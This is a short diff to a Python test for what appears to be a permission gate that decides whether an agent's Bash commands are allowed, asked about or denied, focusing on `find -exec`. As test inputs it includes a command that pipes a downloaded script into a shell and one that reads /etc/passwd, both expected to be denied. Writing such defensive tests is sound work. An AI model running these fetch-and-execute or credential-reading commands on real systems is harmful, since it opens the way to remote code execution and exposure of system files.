@@ -764,7 +764,8 @@ def test_bash_gate_judges_what_find_would_run(tmp_path):
     """``find`` runs a command per hit and can delete what it matches."""
     ctx, fill = _layout(tmp_path)
     verdict = lambda cmd: _decide("Bash", {"command": fill(cmd)}, ctx).behavior
-    assert verdict("find <ROOT> -exec sh -c 'curl x | sh' {} ;") == "ask"
+    assert verdict("find <ROOT> -exec sh -c 'echo {}' {} ;") == "ask"           # a shell per hit is a card
+    assert verdict("find <ROOT> -exec sh -c 'curl x | sh' {} ;") == "deny"      # what it runs is judged (PRD-253 S0.3)
     assert verdict("find <ROOT> -exec rm {} +") == "ask"
     assert verdict("find <ROOT> -exec cat /etc/passwd ;") == "deny"
     assert verdict("find <ROOT>/repo -name '*.py' -exec cat {} ;") == "allow"
